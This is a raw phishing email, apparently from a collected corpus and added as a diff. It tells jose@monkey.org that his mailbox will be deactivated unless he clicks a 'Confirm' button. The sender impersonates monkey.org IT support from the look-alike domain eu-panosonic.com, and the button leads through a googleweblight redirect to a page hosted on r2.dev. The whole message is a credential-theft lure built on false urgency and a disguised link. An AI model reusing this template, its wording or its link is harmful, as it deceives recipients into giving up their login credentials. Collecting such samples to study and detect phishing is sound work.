@@ -1,0 +1,233 @@
+Return-Path: box5358-247customersupport.notify@eu-panosonic.com
+Delivered-To: jose@monkey.org
+X-FDA: 81810261624.40.30812CE
+Received: from slot0.eu-panosonic.com (slot0.eu-panosonic.com [185.167.98.85])
+	by imf07.b.hostedemail.com (Postfix) with ESMTP id 89AABA0013
+	for <jose@monkey.org>; Tue, 20 Feb 2024 00:14:51 +0000 (UTC)
+Authentication-Results: imf07.b.hostedemail.com;	dkim=none ("invalid DKIM
+ record") header.d=eu-panosonic.com header.s=dkim header.b=c6q96ABR;	spf=pass
+ (imf07.b.hostedemail.com: domain of
+ box5358-247customersupport.notify@eu-panosonic.com designates 185.167.98.85
+ as permitted sender)
+ smtp.mailfrom=box5358-247customersupport.notify@eu-panosonic.com;	dmarc=pass
+ (policy=none) header.from=eu-panosonic.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1708388091;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=tsgXqpQeiWqTv3s67jLbML0xhrlFcmdg4xxrP8zXPRs=;
+	b=TZsyz8ZiMxGB2hhvYE42swIn39tT8IiOiX6u1WsKC2T30sfn1FfOR7nj05AAKd+1DStEuZ
+	Wrj3QFu9V3NYK8AqeZhN63LiVpCGM3i5wgZZp5b4Rt3/8kXwnmgWOWBkisujn3U+Q6WBE1
+	A1rPg/vOGJ0raccZvRsx2Yx0JMKlzn8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1708388091; a=rsa-sha256;
+	cv=none;
+	b=p8NLtZ51mnYFJXTRDKiB/gcn1VN13M/39bJ0xw/lDdvn4LMf1zc7K5UbkCAlswByG3GkmU
+	CU8pEQB26aDL2vExlR/CcnBFxC2g9k+oGGQLBF/TKh1nqhwwXXqc+flRQoGWHCVaoKdty7
+	4svX31YKEH2wWgx/WRMJcYH7EokRIi4=
+ARC-Authentication-Results: i=1;	imf07.b.hostedemail.com;	dkim=none ("invalid
+ DKIM record") header.d=eu-panosonic.com header.s=dkim header.b=c6q96ABR;
+	spf=pass (imf07.b.hostedemail.com: domain of
+ box5358-247customersupport.notify@eu-panosonic.com designates 185.167.98.85
+ as permitted sender)
+ smtp.mailfrom=box5358-247customersupport.notify@eu-panosonic.com;	dmarc=pass
+ (policy=none) header.from=eu-panosonic.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
+ d=eu-panosonic.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding;
+ i=box5358-247customersupport.notify@eu-panosonic.com;
+ bh=tsgXqpQeiWqTv3s67jLbML0xhrlFcmdg4xxrP8zXPRs=; =?utf-8?q?b=3Dc6q96ABRTmYm?=
+ =?utf-8?q?KHIKEB/RTbPAa0gtZxQvhu+FnR1UIVC/b1T6s6KEfPvoO0nd2Zk0AGxC/bRF/Q4E?=
+  
+ EylKL4z9DQUdNfBGH6VZhqJxrd7G84Wuqi8ANmoOUhGMs8kMF6r5GDO9HEP7TlcGD4RKspMe23no
+  
+ Z0hkjG+dV1sickkBev8kOPb5WGgzCfp3Ec3XquXlPZrgYl0VGe8fitUEPawN3qTJQASjYAXIfl/f
+  
+ pgp1umcldIm0iT2AhkuPYo0ABrRLfMVuLv4FnNsZ9c9oLTQka+x+H3FLKJJ+7BV18Y45CfEaLcgT
+   uDTKSzmbvaMMsjlcbnvVX0/Wjz/RoNhQFjwlKA==
+From: "monkey.org" <box5358-247customersupport.notify@eu-panosonic.com>
+To: jose@monkey.org
+Subject: Confirmation Of Mailbox jose@monkey.org Avoid De-activation Now
+Date: 20 Feb 2024 01:04:48 +0100
+Message-ID: <20240220010448.714166F5EBC130BA@eu-panosonic.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 89AABA0013
+X-Stat-Signature: 4p5sxs4w55efbnet5ehe7nm93nfp3q8w
+X-Spam-Status: No, score=0.55
+X-Rspam-User: 
+X-HE-Tag: 1708388091-286896
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19ibbUJCgniHvrpNVDkgipVjpmbwPLXYu8+4mtpXGcarUO?=
+ =?utf-8?q?BIxZ3+Gmsai2lPnQQAvxXVfVIKFoD5tAWQtjsySMv+qgNG8fe+Kol9sl7n7F0DHSD?=
+ =?utf-8?q?uNkG/Dol0uMMwzKp/Cpl2uCUzsELYgcBasebrDhOTvjuzWyEozxqcDvq3NitNlvaM?=
+ =?utf-8?q?2xIdGvAwTJ5rCap0f6/TN8W/9eoF4Bvr6qJSna5K7nvzwQAn/rZhfJqz1/1iiPd58?=
+ =?utf-8?q?7EG/UlUlV7nhxjbKd+3ihML5stKHlQjh0jE3noFy1zg1MvhPvs8Uwj5s5YY81DYKm?=
+ =?utf-8?q?NVdRfMF0d6eIr0ka6G0pIVKndkQ=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 62
+
+<HTML><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19626">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; padding-top: 0px; font-family: Arial, Helvetica,=
+ sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
+pacing: 0px; border-top-color: currentColor; border-top-width: 0px; border-=
+top-style: none; white-space: normal; orphans: 2; widows: 2; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; tex=
+t-decoration-color: initial;">
+<table width=3D"100%" height=3D"100%" id=3D"m_-9213493243175699363m_4184279=
+948822327053gmail-m_4670753337116390701gmail-m_-8156337560563883869bodyTabl=
+e" style=3D"margin: 0px auto; padding: 0px; width: 864px; height: 342px; bo=
+rder-collapse: collapse; table-layout: fixed; border-spacing: 0px;" bgcolor=
+=3D"#f4f4f4" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; border-collapse: collapse;">
+<table width=3D"100%" align=3D"center" class=3D"m_-9213493243175699363m_418=
+4279948822327053gmail-m_4670753337116390701gmail-m_-8156337560563883869emai=
+l-container" style=3D"margin: 5px auto; border-collapse: collapse; max-widt=
+h: 620px; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; border-collapse: collapse;">
+<table width=3D"100%" style=3D"border: 1px solid rgb(204, 204, 204); border=
+-image: none; border-collapse: collapse; border-spacing: 0px; background-co=
+lor: rgb(228, 228, 228);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr height=3D"32">
+<td width=3D"32" align=3D"left" valign=3D"middle" style=3D"margin: 0px; pad=
+ding-right: 15px; padding-left: 15px; font-family: Roboto, RobotoDraft, Hel=
+vetica, Arial, sans-serif; border-collapse: collapse;"><br class=3D"m_-9213=
+493243175699363m_4184279948822327053gmail-m_4670753337116390701gmail-Apple-=
+interchange-newline"><br><br></td>
+<td align=3D"left" valign=3D"middle" style=3D'margin: 0px; font-family: "Sy=
+mantec Sans"; font-size: 16px; border-collapse: collapse;'><font style=3D"v=
+ertical-align: inherit;"><font style=3D"vertical-align: inherit;">Server Ad=
+ministrator |&nbsp;IT Support</font></font><br></td></tr>
+<tr height=3D"3" style=3D"padding-left: 15px;">
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; border-collapse: collapse;"></td>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; border-collapse: collapse;"></td></tr></tbody></table>
+<table width=3D"100%" style=3D"border: 1px solid rgb(204, 204, 204); border=
+-image: none; border-collapse: collapse; border-spacing: 0px; background-co=
+lor: rgb(255, 255, 255);" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0=
+" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 0px 15px; line-height: 27px; font-family=
+: Calibri; font-size: 13px; border-collapse: collapse; background-color: rg=
+b(236, 243, 249);"><b><font style=3D"vertical-align: inherit;"><font style=
+=3D"vertical-align: inherit;">Dear jose</font></font></b></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px 15px 5px; line-height: 27px; font-fa=
+mily: Calibri; font-size: 13px; border-collapse: collapse; background-color=
+: rgb(236, 243, 249);">
+<table width=3D"100%" style=3D"font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr style=3D'color: rgb(64, 64, 64); line-height: 26px; font-family: "Open =
+Sans", HelveticaNeue-Light, "Helvetica Neue Light", "Helvetica Neue", Helve=
+tica, Arial, "Lucida Grande", sans-serif; font-size: 16px;'>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;">
+<p><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: =
+inherit;">We are closing all old versions and non-active users from (2/19/2=
+024). Please confirm your email address jose@monkey.org to keep your accoun=
+t from being deactivated.</font></font></p></td></tr></tbody></table></td><=
+/tr>
+<tr>
+<td width=3D"300" align=3D"left" style=3D"margin: 0px; padding: 10px; font-=
+family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; border-collapse:=
+ collapse;">
+<a style=3D'margin: 0px; padding: 14px 7px; border-radius: 4px; width: 210p=
+x; text-align: center; color: white; font-family: "Open Sans", "Helvetica N=
+eue", Arial; font-size: 15px; display: block; max-width: 210px; background-=
+color: darkblue; text-decoration-line: none;' href=3D"https://googlewebligh=
+t.com/i?u=3Dhttps://pub-2706efed16964385810567666db85f2f.r2.dev/JAJS026.htm=
+l#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"><font style=3D"vert=
+ical-align: inherit;">
+<font style=3D"vertical-align: inherit;">Confirm</font></font></a></td></tr=
+>
+<tr>
+<td style=3D"margin: 0px; padding: 5px 15px; line-height: 0; font-family: R=
+oboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 0px; border-co=
+llapse: collapse;">&nbsp;</td></tr>
+<tr style=3D"margin-top: 10px; background-color: rgb(228, 228, 228);">
+<td style=3D"margin: 0px; padding: 10px 15px; line-height: 20px; font-famil=
+y: Calibri; font-size: 13px; border-collapse: collapse;">
+<p></p>
+<p><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: =
+inherit;">Account will be&nbsp; automatically deleted after (3/19/2024). Yo=
+u can change the frequency of these notifications within your mailbox porta=
+l.</font></font></p></td></tr>
+<tr align=3D"left" style=3D"padding: 0px 0px 10px 15px; margin-top: 10px; b=
+ackground-color: rgb(228, 228, 228);">
+<td style=3D"margin: 0px; padding-top: 10px; padding-bottom: 10px; padding-=
+left: 15px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;=
+ border-collapse: collapse;"></td></tr></tbody></table></td></tr></tbody></=
+table></td></tr></tbody></table></div>
+<p style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdana, Ar=
+ial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-weigh=
+t: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; back=
+ground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: in=
+itial; text-decoration-color: initial;'>
+<br style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
+ize: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style=
+: initial; text-decoration-color: initial;"></p>
+<hr style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
+ize: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-style: initial; text-decoration-color: ini=
+tial;">
+
+<p style=3D'color: rgb(70, 87, 107); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: Roboto, "Lucida Grande", Verdana, Ar=
+ial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-weigh=
+t: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; back=
+ground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: in=
+itial; text-decoration-color: initial;'>
+<font color=3D"gray" face=3D"Arial" size=3D"1" style=3D"text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-style: normal; font-weigh=
+t: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-style: initial; text-decoration-color: initial;=
+"><br><font style=3D"vertical-align: inherit;"><font style=3D"vertical-alig=
+n: inherit;">
+This e-mail may be privileged and/or confidential, and the sender does not =
+waive any related rights and obligations. Any distribution, use or copying =
+of this e-mail or the information it contains by other than an intended rec=
+ipient is unauthorized. If you received this e-mail in error, please advise=
+ me (by return e-mail or otherwise) immediately&nbsp;</font></font></font><=
+span>&nbsp;</span>
+<span style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font=
+-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; floa=
+t: none; display: inline !important; white-space: normal; orphans: 2; widow=
+s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-style: initial; text-decoration-color: initial;">
+&nbsp;&nbsp;</span></p></BODY></HTML>
+
